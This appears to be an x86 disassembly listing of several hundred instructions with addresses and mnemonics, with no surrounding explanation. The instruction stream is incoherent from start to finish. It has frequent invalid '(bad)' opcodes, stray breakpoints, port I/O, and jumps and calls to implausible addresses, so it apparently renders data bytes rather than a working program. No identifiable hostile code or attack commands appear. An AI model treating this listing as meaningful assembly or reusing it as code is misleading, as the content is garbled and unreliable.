  431e4e:	mov    eax,DWORD PTR [eax]
  431e50:	aam    0x0
  431e52:	dec    ebp
  431e53:	jne    0x431de0
  431e55:	cmp    ebx,eax
  431e57:	jb     0x431ea6
  431e59:	jmp    0x431de6
  431e5b:	mov    ebx,esp
  431e5d:	int3   
  431e5e:	dec    ebp
  431e5f:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431e66:	mov    edx,0x8b0a8b
  431e6b:	cmp    ecx,DWORD PTR [eax]
  431e6d:	jb     0x431e46
  431e6f:	pop    edx
  431e70:	push   edi
  431e71:	cli    
  431e72:	pop    es
  431e73:	mov    eax,ecx
  431e75:	jb     0x431e79
  431e77:	add    DWORD PTR [ebx],0xa
  431e7a:	mov    eax,DWORD PTR [ebx]
  431e7c:	int3   
  431e7d:	add    bh,BYTE PTR [esi+0x75d10006]
  431e83:	jmp    0x431e10
  431e85:	mov    al,0xe8
  431e87:	call   0x1042109
  431e8c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e8f:	pop    edi
  431e90:	or     BYTE PTR [ecx-0x73],bl
  431e93:	pop    ecx
  431e94:	inc    edi
  431e95:	xor    al,0xeb
  431e97:	push   ecx
  431e98:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e9e:	call   0xb21fa3
  431ea3:	int3   
  431ea4:	sbb    BYTE PTR [esi],ch
  431ea6:	inc    ebp
  431ea7:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431ead:	call   0x9c211c
  431eb2:	or     BYTE PTR [ebx-0x73],dl
  431eb5:	cmp    al,0x47
  431eb7:	mov    al,0x1
  431eb9:	jb     0x431ebb
  431ebb:	mov    al,0x10
  431ebd:	push   eax
  431ebe:	add    al,0x75
  431ec0:	add    BYTE PTR [ebx],ch
  431ec2:	add    ebx,esp
  431ec4:	int3   
  431ec5:	jne    0x431ed7
  431ec7:	movsx  edx,cl
  431eca:	add    DWORD PTR [eax],eax
  431ecc:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431ed3:	mov    gs,edi
  431ed5:	add    BYTE PTR [eax-0x50],ch
  431ed8:	add    al,ch
  431eda:	mov    eax,DWORD PTR [ecx]
  431edc:	sub    eax,DWORD PTR [eax]
  431ede:	jb     0x431f55
  431ee0:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431ee4:	jge    0x431ece
  431ee6:	add    al,0x1
  431ee8:	add    DWORD PTR [eax],0x0
  431eeb:	jne    0x431eed
  431eed:	je     0x431f34
  431eef:	mov    eax,DWORD PTR [edi]
  431ef1:	ror    BYTE PTR [ebp+0x4d],1
  431ef4:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431efb:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431f01:	mov    DWORD PTR [ebx],ebp
  431f03:	fadd   DWORD PTR [eax+0x75]
  431f06:	inc    eax
  431f07:	pop    eax
  431f08:	lea    ebx,[ecx+0x4f]
  431f0b:	push   0xb1000003
  431f10:	out    dx,eax
  431f11:	add    ebp,DWORD PTR [edx+edx*2]
  431f14:	add    BYTE PTR [ebx+ecx*4],bh
  431f17:	mov    ch,BYTE PTR [ebx]
  431f19:	jb     0x431f8d
  431f1b:	add    al,0x89
  431f1d:	push   eax
  431f1e:	call   0x842b6c90
  431f23:	add    DWORD PTR [eax+eax*1],eax
  431f26:	jae    0x431f3c
  431f28:	icebp  
  431f29:	inc    ebp
  431f2a:	mov    eax,DWORD PTR gs:[ecx]
  431f2d:	int3   
  431f2e:	out    dx,al
  431f2f:	loopne 0x431f7e
  431f31:	sub    eax,DWORD PTR [edx]
  431f33:	push   0xffffff83
  431f35:	pop    esi
  431f36:	push   cs
  431f37:	jl     0x431f52
  431f39:	add    al,0xaf
  431f3b:	xor    eax,0x832b6d00
  431f40:	mov    eax,DWORD PTR [edx]
  431f42:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431f48:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431f4e:	inc    ebp
  431f4f:	shr    ebx,0x3
  431f52:	or     DWORD PTR [eax],0x4
  431f55:	push   0xffffffa5
  431f57:	pop    esi
  431f58:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431f5f:	jmp    0x431fbe
  431f61:	mov    edi,0xff0272
  431f66:	fdivr  QWORD PTR [ebp+0x5d]
  431f69:	push   0x4e
  431f6b:	pop    ecx
  431f6c:	call   0x436371
  431f71:	mov    DWORD PTR [ebx],eax
  431f73:	in     al,0xc8
  431f75:	rol    BYTE PTR [ebp-0x75],0xc1
  431f79:	call   0xad215a
  431f7e:	pop    esi
  431f7f:	enter  0xceff,0x8b
  431f83:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f87:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f8e:	je     0x431f90
  431f90:	or     DWORD PTR [ebx-0x74183b24],eax
  431f96:	jne    0x431f7c
  431f98:	jmp    0x431f93
  431f9a:	push   DWORD PTR [edx-0x24]
  431f9d:	push   0x4d
  431f9f:	pop    ecx
  431fa0:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431fa4:	jge    0x431fac
  431fa6:	mov    eax,eax
  431fa8:	sub    ebp,DWORD PTR [edx+0x24]
  431fab:	pop    esi
  431fac:	inc    ebp
  431fad:	mov    esp,0x8b6077
  431fb2:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431fb8:	lods   al,BYTE PTR ds:[esi]
  431fb9:	add    BYTE PTR [ebx],bh
  431fbb:	enter  0xce73,0x49
  431fbf:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431fc7:	stc    
  431fc8:	jge    0x43203c
  431fca:	jnp    0xdd42a339
  431fd0:	call   0xc620a6
  431fd5:	fadd   st(0),st
  431fd7:	dec    esi
  431fd8:	ins    BYTE PTR es:[edi],dx
  431fd9:	stc    
  431fda:	cmp    al,0x73
  431fdc:	push   ebp
  431fdd:	mov    eax,0xf8028b
  431fe2:	jne    0x431fa5
  431fe4:	mov    esi,ecx
  431fe6:	mov    esp,DWORD PTR [ebp+0x2c]
  431fe9:	add    edi,DWORD PTR [ebp-0x24]
  431fec:	sub    esp,eax
  431fee:	and    al,0x45
  431ff0:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431ff6:	sbb    al,0xee
  431ff8:	pop    esi
  431ff9:	call   0x832029
  431ffe:	fsubr  st,st(3)
  432000:	sti    
  432001:	add    BYTE PTR gs:[ecx],bh
  432004:	add    eax,esp
  432006:	add    DWORD PTR [esi],eax
  432008:	rol    DWORD PTR [ebp+0x8],0x29
  43200c:	mov    esp,eax
  43200e:	clc    
  43200f:	jne    0x432086
  432011:	mov    eax,0x8b0673
  432016:	loopne 0x43205d
  432018:	loopne 0x431fa3
  43201a:	lods   al,BYTE PTR ds:[esi]
  43201b:	int3   
  43201c:	inc    ebp
  43201d:	mov    DWORD PTR gs:[eax+edi*8],eax
  432021:	add    al,0xc3
  432023:	sub    ecx,DWORD PTR [ebp+0x47]
  432026:	(bad)  
  432028:	shr    BYTE PTR [ebp-0x1f],0xe8
  43202c:	add    eax,DWORD PTR [eax]
  43202e:	call   0x644e133
  432033:	add    esi,DWORD PTR [esi-0x3b2efc83]
  432039:	dec    esi
  43203a:	ins    DWORD PTR es:[edi],dx
  43203b:	in     al,dx
  43203c:	lea    eax,[eax]
  43203e:	inc    ebp
  43203f:	inc    ebp
  432040:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  432046:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  432050:	and    al,0xdc
  432052:	ror    DWORD PTR [edx+0x24],0xf7
  432056:	or     BYTE PTR [ebp+0x4c],dh
  432059:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43205d:	stos   BYTE PTR es:[edi],al
  43205e:	adc    edx,edi
  432060:	inc    esp
  432061:	add    edi,DWORD PTR [eax]
  432063:	jne    0x432048
  432065:	mov    DWORD PTR [eax-0x7449db04],ecx
  43206b:	cmp    ecx,DWORD PTR [edi]
  43206d:	sub    BYTE PTR [ebp-0x7e],dl
  432070:	sar    ebp,0xb
  432073:	jmp    FWORD PTR [edi+0x2400392a]
  432079:	sub    esi,DWORD PTR [ebx-0x73]
  43207c:	mov    esp,DWORD PTR [ecx+edi*4]
  43207f:	mov    ecx,DWORD PTR [eax]
  432081:	and    BYTE PTR [eax],al
  432083:	jne    0x43204f
  432085:	sub    ebp,ecx
  432087:	sbb    BYTE PTR [esi+0x32],ah
  43208a:	dec    ebp
  43208b:	push   ebp
  43208c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432092:	ret    
  432093:	mov    edx,ebp
  432095:	leave  
  432096:	sub    DWORD PTR [esi+0x24],ebx
  432099:	ret    0x2b
  43209c:	pop    ax
  43209e:	push   ebp
  43209f:	rol    BYTE PTR [ebx],0xeb
  4320a2:	add    DWORD PTR [ecx+0x6c0001],0x40
  4320a9:	jb     0x432100
  4320ab:	ret    
  4320ac:	in     al,dx
  4320ad:	jecxz  0x43203a
  4320af:	push   esi
  4320b0:	xchg   esp,eax
  4320b1:	jne    0x4320b3
  4320b3:	cmp    edx,DWORD PTR [esi+0x1c]
  4320b6:	jne    0x43209c
  4320b8:	mov    eax,DWORD PTR [ebp-0x77]
  4320bb:	ror    DWORD PTR [ebx+0x899408],0xe0
  4320c2:	mov    esi,DWORD PTR [ebp-0x75]
  4320c5:	pop    esi
  4320c6:	nop
  4320c7:	mov    eax,DWORD PTR [eax]
  4320c9:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4320cf:	add    al,0x0
  4320d1:	inc    ebp
  4320d2:	mov    eax,DWORD PTR [ebx]
  4320d4:	mov    ebp,ebx
  4320d6:	cmp    al,0xf
  4320d8:	or     al,al
  4320da:	inc    ebp
  4320db:	inc    ebp
  4320dc:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  4320e4:	mov    bh,0xc0
  4320e6:	push   ss
  4320e7:	ins    BYTE PTR es:[edi],dx
  4320e8:	push   ecx
  4320e9:	add    BYTE PTR [ecx-0x5],dl
  4320ec:	add    eax,0x17200
  4320f1:	sbb    al,0x85
  4320f3:	dec    esp
  4320f4:	je     0x43212e
  4320f6:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4320fa:	add    BYTE PTR [ebx],bh
  4320fc:	(bad)  
  4320fd:	and    al,0x39
  4320ff:	jae    0x43209d
  432101:	mov    cl,cl
  432103:	inc    DWORD PTR [esp]
  432106:	push   ebp
  432107:	shr    esp,0x8
  43210a:	in     al,dx
  43210b:	push   esp
  43210c:	add    DWORD PTR [eax],esp
  43210e:	add    bl,cl
  432110:	inc    ebp
  432111:	mov    bh,0x89
  432113:	add    ah,bh
  432115:	jmp    0xca7c305f
  43211a:	pushf  
  43211b:	dec    esp
  43211c:	mov    edx,0xf8178520
  432121:	fst    DWORD PTR [ebp+0x0]
  432124:	mov    BYTE PTR [eax],0xc4
  432127:	sub    edx,DWORD PTR [ebx-0x3f]
  43212a:	inc    ebp
  43212b:	add    eax,0xc601da
  432130:	mov    al,0xc6
  432133:	ins    BYTE PTR es:[edi],dx
  432134:	mov    DWORD PTR [eax+0x57],0x280545c1
  43213b:	dec    esp
  43213c:	jmp    DWORD PTR [eax]
  43213e:	inc    ebp
  43213f:	fnstcw WORD PTR [esi+0x29]
  432142:	test   BYTE PTR [eax],0xc6
  432145:	rol    BYTE PTR [eax],0xc0
  432148:	lea    ecx,[ebp-0x3cf0dbcb]
  43214e:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  432154:	inc    esi
  432155:	add    DWORD PTR [eax],ebx
  432157:	add    dh,bh
  432159:	mov    esi,DWORD PTR [edx+0x8]
  43215c:	(bad)  
  43215d:	fdiv   QWORD PTR ss:[ecx]
  432160:	(bad)  
  432161:	mov    bl,ch
  432163:	add    esi,eax
  432165:	add    dh,bl
  432167:	or     esi,eax
  432169:	mov    dl,0xdf
  43216b:	add    esi,eax
  43216d:	add    al,ah
  43216f:	push   cs
  432170:	mov    BYTE PTR [edx+0xc601e1],0xe2
  432177:	or     BYTE PTR [ebx],dh
  432179:	dec    ecx
  43217a:	lea    eax,[ebx]
  43217c:	xor    eax,0x18fc0fc7
  432181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432182:	repz clc 
  432184:	add    eax,DWORD PTR [ebp+0x46]
  432187:	prefetcht0 BYTE PTR [ecx-0x2]
  43218b:	xor    eax,0x7c60872
  432190:	mov    esp,0xbd32c699
  432195:	pop    esi
  432196:	mov    cl,0xbe
  432199:	or     al,0xc6
  43219b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4321a2:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4321a9:	add    dh,al
  4321ab:	mov    eax,ebx
  4321ad:	xor    DWORD PTR [ebx],0x35008dbc
  4321b3:	mov    ecx,DWORD PTR [edi]
  4321b5:	sbb    al,0x18
  4321b7:	inc    ebp
  4321b8:	xrelease mov DWORD PTR [ebx],0x188546f4
  4321bf:	clc    
  4321c0:	(bad)  
  4321c1:	ss jb  0x432160
  4321c4:	lea    ecx,[ecx+0x45ffe838]
  4321ca:	mov    ebp,esp
  4321cc:	fadd   st,st(6)
  4321ce:	dec    ebp
  4321cf:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4321d5:	out    0x1,eax
  4321d7:	inc    ebp
  4321d8:	lea    ebp,[ecx]
  4321da:	inc    esi
  4321dc:	dec    eax
  4321de:	enter  0xa33,0xc6
  4321e2:	push   ebp
  4321e3:	leave  
  4321e4:	(bad)  
  4321e5:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4321eb:	add    BYTE PTR [ebp+0x44],al
  4321ee:	mov    eax,esp
  4321f0:	mov    WORD PTR [esi+0x44398300],?
  4321f6:	psubusw mm4,QWORD PTR [eax-0x78]
  4321fa:	add    BYTE PTR [ebx-0x1303f975],al
  432200:	add    BYTE PTR [ebp+0x1],0xeb
  432204:	add    BYTE PTR [ebp+0x38],al
  432207:	jmp    0xdbce6751
  43220c:	add    BYTE PTR [ebp+0x0],0xe8
  432210:	mov    DWORD PTR [ebp-0x48],eax
  432213:	sub    DWORD PTR [edi+0x45],ecx
  432216:	add    BYTE PTR [eax],ch
  432218:	js     0x43225f
  43221a:	data16 jle 0x4321a2
  43221d:	idiv   bh
  43221f:	inc    esp
  432220:	(bad)  
  432221:	fadd   st(7),st
  432223:	mov    dh,0x89
  432225:	and    DWORD PTR [esi+0x44],0xffffffff
  432229:	fld    DWORD PTR [ebx-0x767cbc78]
  43222f:	pop    es
  432230:	push   0x8d45ffec
  432235:	jmp    0xe6cc673d
  43223a:	push   0x45
  43223c:	jmp    edx
  43223e:	add    DWORD PTR [ebp+0xd],0xfffffff5
  432242:	mov    DWORD PTR [ebp+0x6c],eax
  432245:	(bad)  
  432247:	inc    ebp
  432248:	(bad)  
  432249:	out    dx,al
  43224a:	add    al,0x45
  43224c:	mov    edi,esp
  43224e:	outs   dx,BYTE PTR ds:[esi]
  43224f:	inc    ebp
  432250:	(bad)  
  432251:	jle    0x4321d6
  432253:	idiv   BYTE PTR ds:0x70bc8944
  432259:	mov    dh,0xff
  43225b:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  432262:	jb     0x4321e7
  432264:	dec    DWORD PTR [eax]
  432266:	mov    ebp,esp
  432268:	test   WORD PTR [ebp-0x1],ax
  43226f:	inc    ebp
  432270:	ror    BYTE PTR [ebx-0x137a279a],0xff
  432277:	adc    edi,edi
  432279:	mov    ebp,edi
  43227b:	mov    eax,DWORD PTR [eax]
  43227d:	cmp    BYTE PTR [esi-0x1],ah
  432280:	test   DWORD PTR [ebx],edi
  432282:	push   DWORD PTR [ebp-0x1]
  432285:	mov    DWORD PTR [esi-0x48],ebp
  432288:	add    BYTE PTR [ebp+0x66],al
  43228b:	jmp    0x432212
  43228d:	pushf  
  43228e:	dec    DWORD PTR [ebx-0x7f940301]
  432294:	add    BYTE PTR [ecx],al
  432296:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43229d:	add    al,al
  43229f:	add    BYTE PTR [esi+0x45],ah
  4322a2:	test   DWORD PTR [ebx+0xff7cff],ecx
  4322a8:	inc    eax
  4322a9:	mov    DWORD PTR [eax],eax
  4322ab:	mov    esp,DWORD PTR [esi-0x4]
  4322ae:	inc    ebp
  4322af:	cmp    BYTE PTR [eax+0x4701],0x38
  4322b6:	mov    DWORD PTR [ebp-0x7e],ebp
  4322b9:	add    BYTE PTR [edi-0x73],al
  4322bc:	push   0xffffffcd
  4322be:	mov    WORD PTR [ebp+0x64],ax
  4322c2:	(bad)  
  4322c3:	call   eax
  4322c5:	mov    esp,esi
  4322c7:	data16 cmc 
  4322c9:	test   DWORD PTR [ebp-0x1],eax
  4322cc:	(bad)  
  4322ce:	out    0xc0,eax
  4322d0:	lea    esp,[esi-0x30]
  4322d3:	test   DWORD PTR [edx+0x44ff80ff],ecx
  4322d9:	inc    edi
  4322da:	jmp    0x75ff:0x40858866
  4322e1:	dec    DWORD PTR [ebp-0x7a992f40]
  4322e7:	test   esi,edi
  4322e9:	(bad)  
  4322ea:	(bad)  
  4322eb:	inc    DWORD PTR [ebp-0x9901b9]
  4322f1:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  4322f7:	rcl    BYTE PTR [ecx+0x66],0x33
  4322fb:	test   DWORD PTR [ebx+0xff72ff],edi
  432301:	inc    edi
  432302:	ret    
  432303:	mov    ax,WORD PTR [ebp-0x3f0004]
  43230a:	push   eax
  43230b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432312:	add    BYTE PTR [ebx-0x764f0839],al
  432318:	push   DWORD PTR [esi+0x1]
  43231b:	inc    DWORD PTR [eax]
  43231d:	mov    eax,0xff99ff
  432322:	or     BYTE PTR [ecx-0x7a87bb],cl
  432328:	jne    0x4322e2
  43232a:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  432334:	mov    ecx,0xd74fb8
  432339:	add    cl,al
  43233b:	mov    DWORD PTR [ecx-0x3f007784],ecx
  432341:	or     DWORD PTR [ebx+0x558966e4],0x7e
  432348:	(bad)  
  432349:	(bad)  
  43234a:	std    
  43234b:	mov    eax,0x8c2789
  432350:	ret    0x6689
  432353:	adc    BYTE PTR [ebp+0x40],0x8d
  432357:	add    bh,ah
  432359:	mov    WORD PTR [ebp-0x70],ax
  43235d:	(bad)  
  43235e:	ret    0x6605
  432361:	or     BYTE PTR [ebp-0x77],dl
  432364:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  43236b:	loop   0x4322f6
  43236d:	(bad)  
  43236e:	xchg   esi,eax
  43236f:	aam    0xcf
  432371:	out    dx,al
  432372:	mov    DWORD PTR [esi-0x68],edi
  432375:	inc    ebp
  432376:	dec    edx
  432377:	pop    ecx
  432378:	mov    edx,DWORD PTR [eax]
  43237a:	repnz push bp
  43237d:	or     BYTE PTR [ebx+0x5510663a],0x49
  432384:	(bad)  
  432385:	repnz cmp eax,0xa0898945
  43238b:	mov    ah,0x89
  43238d:	jmp    DWORD PTR [edx+0x66b0418d]
  432393:	inc    DWORD PTR [ebp+0x50]
  432396:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43239a:	mov    DWORD PTR [eax],ecx
  43239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43239d:	pop    es
  43239e:	inc    ecx
  43239f:	(bad)  
  4323a0:	cwd    
  4323a2:	inc    ebp
  4323a3:	xor    ah,BYTE PTR [esi+0x3]
  4323a6:	dec    ebp
  4323a7:	push   eax
  4323a8:	inc    bp
  4323aa:	jge    0x43232f
  4323ac:	mov    esp,DWORD PTR [esi-0x18]
  4323af:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4323b5:	add    DWORD PTR [ebx],esi
  4323b7:	add    BYTE PTR [ebx],al
  4323b9:	test   DWORD PTR [ebx],esi
  4323bb:	(bad)  
  4323bc:	inc    WORD PTR [ebp+0x0]
  4323c0:	mov    eax,DWORD PTR [eax]
  4323c2:	call   0x8898daf7
  4323c7:	mov    esi,eax
  4323c9:	clc    
  4323ca:	ret    
  4323cb:	rol    cl,0xa
  4323ce:	mov    DWORD PTR ds:0x7c0ec88,esi
  4323d4:	mov    edx,edi
  4323d6:	pushf  
  4323d7:	pop    es
  4323d8:	jmp    DWORD PTR [edx+0x66]
  4323db:	add    BYTE PTR [ebp-0x990175],al
  4323e1:	inc    ebp
  4323e2:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4323e8:	push   ebp
  4323e9:	mov    edi,eax
  4323eb:	mov    dh,BYTE PTR [eax+0x266ff51]
  4323f1:	push   ebp
  4323f2:	add    BYTE PTR [ebx-0x764b0777],al
  4323f8:	dec    DWORD PTR [esi+0x661851e8]
  4323fe:	add    BYTE PTR [ebp-0x7b],dl
  432401:	cmp    esi,0x3
  432404:	dec    DWORD PTR [ecx+0x51fe9285]
  43240a:	jmp    DWORD PTR [esi-0x75]
  43240d:	push   ebp
  43240e:	hlt    
  43240f:	data16 (bad) 
  432411:	dec    ebp
  432412:	ret    
  432413:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432419:	lea    edx,[eax-0x1]
  43241c:	jne    0x4323ef
  43241e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  432424:	dec    BYTE PTR [ecx+0x51559eff]
  43242a:	mov    DWORD PTR [esi-0x4c],esp
  43242d:	push   ebp
  43242e:	jmp    DWORD PTR [esi-0x18]
  432431:	inc    ebp
  432432:	sbb    BYTE PTR [ebp-0x767ad900],cl
  432438:	(bad)  
  432439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43243a:	inc    eax
  43243c:	test   DWORD PTR [esi-0x2],esp
  43243f:	inc    ebp
  432440:	dec    DWORD PTR [ebp-0x760bde75]
  432446:	(bad)  
  432447:	test   al,0xc3
  432449:	mov    DWORD PTR [ebp-0x769b56],ecx
  43244f:	lods   al,BYTE PTR ds:[esi]
  432450:	push   eax
  432451:	inc    ebp
  432452:	jne    0x432463
  432454:	dec    DWORD PTR [ebp+0x8]
  432457:	mov    eax,DWORD PTR [edi]
  432459:	sbb    al,0x0
  43245b:	(bad)  
  43245c:	mov    eax,0xc14fc3
  432461:	mov    DWORD PTR [eax-0x64],edi
  432464:	inc    bp
  432466:	test   DWORD PTR [edi],ecx
  432468:	dec    DWORD PTR [ebp-0x1]
  43246b:	xor    eax,edi
  43246d:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  432473:	inc    ebp
  432474:	xor    DWORD PTR [ebx],0x43
  432477:	mov    WORD PTR [ebp-0x1bc],ax
  43247e:	lea    ecx,[ecx-0x7677fe]
  432484:	inc    esi
  432485:	(bad)  
  432486:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43248d:	pushf  
  43248e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432495:	add    bh,bh
  432497:	add    BYTE PTR [edi],cl
  432499:	test   DWORD PTR [eax],eax
  43249b:	(bad)  
  43249c:	dec    WORD PTR [ebp-0xff002d]
  4324a3:	mov    DWORD PTR [eax-0x48],esi
  4324a6:	add    bh,bh
  4324a8:	lea    cx,[ebp-0x50]
  4324af:	push   eax
  4324b0:	rol    BYTE PTR [ebp+0x0],1
  4324b3:	xor    esp,DWORD PTR [esi+0x3]
  4324b6:	lea    edx,[eax-0x1]
  4324b9:	test   edi,edi
  4324bb:	dec    DWORD PTR [ebp-0x1]
  4324be:	mov    edi,edi
  4324c0:	dec    eax
  4324c1:	clc    
  4324c2:	call   DWORD PTR [ebp-0x73]
  4324c5:	lea    esi,[eax+0x51ffff88]
  4324cb:	lea    ecx,[ebp-0x78]
  4324ce:	test   WORD PTR [ebp-0x2],ax
  4324d5:	popf   
  4324d6:	push   ecx
  4324d7:	add    BYTE PTR [ecx-0x77],dl
  4324da:	xor    edi,DWORD PTR [eax-0x724a007d]
  4324e0:	cdq    
  4324e1:	mov    al,0x32
  4324e3:	inc    DWORD PTR [ebx]
  4324e5:	push   eax
  4324e6:	push   ecx
  4324e7:	inc    ebp
  4324e8:	shl    BYTE PTR [ebx],1
  4324ea:	lea    eax,[ebx]
  4324ec:	call   DWORD PTR [eax-0x1]
  4324ef:	test   DWORD PTR [ebx],esi
  4324f1:	inc    DWORD PTR [eax-0x1]
  4324f4:	(bad)  
  4324f5:	(bad)  
  4324f6:	(bad)  
  4324f7:	clc    
  4324f8:	call   DWORD PTR [ebp+0x50]
  4324fb:	jmp    0xcc2675
  432500:	inc    esp
  432501:	jae    0x432502
  432503:	add    BYTE PTR [ecx-0x384f73],cl
  432509:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43250f:	mov    eax,DWORD PTR [ecx]
  432511:	data16 add BYTE PTR [ebp-0xb50077],al
  432518:	inc    eax
  43251a:	lea    esp,[esi+0x1c]
  43251d:	test   DWORD PTR [ecx-0xb301],ecx
  432523:	inc    edi
  432524:	(bad)  
  432525:	dec    si
  432527:	test   edi,edi
  432529:	push   DWORD PTR [ecx]
  43252b:	(bad)  
  43252c:	jnp    0x43257d
  43252e:	(bad)  
  43252f:	mov    edx,DWORD PTR [edx-0x7d]
  432532:	(bad)  
  432533:	mov    ebx,0x563a8935
  432538:	(bad)  
  432539:	call   FWORD PTR [esi-0x47]
  43253c:	inc    DWORD PTR ds:0x893000e2
  432542:	(bad)  
  432543:	pop    eax
  432544:	mov    ah,0xff
  432546:	(bad)  
  432547:	mov    ecx,0x5745
  43254c:	dec    DWORD PTR [ecx-0xf7a501]
  432552:	(bad)  
  432553:	mov    ecx,0x456108
  432558:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  43255e:	test   BYTE PTR [ebp-0x72ff23fd],cl
  432564:	inc    BYTE PTR gs:[eax]
  432567:	inc    DWORD PTR [ebp-0x73]
  43256a:	ss (bad) 
  43256c:	pushf  
  43256d:	inc    edi
  43256f:	mov    ebx,eax
  432571:	hlt    
  432572:	test   DWORD PTR [ecx-0xbab708],ecx
  432578:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  43257e:	lock into 
  432580:	test   eax,eax
  432582:	clc    
  432583:	mov    ebx,0x367245
  432588:	lahf   
  432589:	retf   
  43258a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432590:	add    edi,edi
  432592:	add    BYTE PTR [ecx+0x45],dl
  432595:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43259c:	mov    edx,DWORD PTR [ecx-0x74]
  43259f:	inc    DWORD PTR [eax]
  4325a1:	cld    
  4325a2:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4325a8:	add    BYTE PTR [ebp-0x1b0177],al
  4325ae:	jge    0x4325f5
  4325b0:	test   DWORD PTR [ebx+0xff9875],ecx
  4325b6:	sbb    BYTE PTR [esi+0x55],ah
  4325b9:	xchg   ebp,eax
  4325ba:	call   0x4320be
  4325bf:	push   edi
  4325c0:	inc    ebp
  4325c1:	mov    dx,WORD PTR [ebp-0xfc0075]
  4325c8:	cmp    al,0x85
  4325ca:	ud0    eax,DWORD PTR [ebp-0x1]
  4325ce:	test   DWORD PTR [edi+0x74],ecx
  4325d1:	dec    edi
  4325d2:	inc    DWORD PTR [ebp-0xf70004]
  4325d8:	dec    DWORD PTR [edi-0x75]
  4325db:	dec    edi
  4325dc:	cld    
  4325dd:	test   DWORD PTR [eax+0xff01ff],eax
  4325e3:	icebp  
  4325e4:	add    BYTE PTR [edi-0x3a],cl
  4325e7:	test   ebx,eax
  4325e9:	inc    BYTE PTR [ebp-0x1]
  4325ec:	jne    0x4325ee
  4325ee:	mov    eax,DWORD PTR [eax]
  4325f0:	cld    
  4325f1:	xor    BYTE PTR [ecx+0x500155],cl
  4325f7:	push   ebp
  4325f8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4325fe:	add    BYTE PTR [ebp+0x35e90f50],al
  432604:	add    al,BYTE PTR [eax]
  432606:	add    BYTE PTR [ebx-0x38fe4f80],al
  43260c:	add    ah,ch
  43260e:	or     BYTE PTR [ebp+0x4501f845],dh
  432614:	jmp    0xdf290f
  432619:	(bad)  
  43261a:	nop    ecx
  43261d:	test   DWORD PTR [ebp+0x4502f8],eax
  432623:	cmp    BYTE PTR [ebp-0x64],cl
  432626:	mov    eax,edi
  432628:	mov    ebx,DWORD PTR [eax+edx*2]
  43262b:	add    eax,0x45fef885
  432630:	dec    DWORD PTR [ebx+0x339445]
  432636:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43263c:	dec    DWORD PTR [ebx-0x460f0375]
  432642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432643:	add    esi,edi
  432645:	add    bh,bh
  432647:	rdpmc  
  432649:	add    BYTE PTR [ebx],0x1
  43264c:	mov    DWORD PTR [eax],eax
  43264e:	add    al,0x45
  432650:	dec    DWORD PTR [ecx-0x360b3373]
  432656:	dec    DWORD PTR [esi]
  432658:	push   eax
  432659:	jne    0x4326a0
  43265b:	mov    esi,DWORD PTR [ebx]
  43265d:	cld    
  43265e:	add    ebp,ebx
  432660:	push   eax
  432661:	inc    DWORD PTR [ebp-0x75]
  432664:	add    eax,0x800e4
  432669:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43266f:	mov    DWORD PTR [ecx],eax
  432671:	sbb    al,0x0
  432673:	leave  
  432674:	test   DWORD PTR [edi-0x2],eax
  432677:	jne    0x432678
  432679:	call   0xff44117e
  43267e:	xor    BYTE PTR [ebp+0x4d],al
  432681:	mov    edi,edi
  432683:	enter  0x8,0x4d
  432687:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43268d:	mov    eax,DWORD PTR [eax]
  43268f:	cld    
  432690:	add    DWORD PTR [ecx],ebx
  432692:	inc    ebp
  432693:	dec    ebp
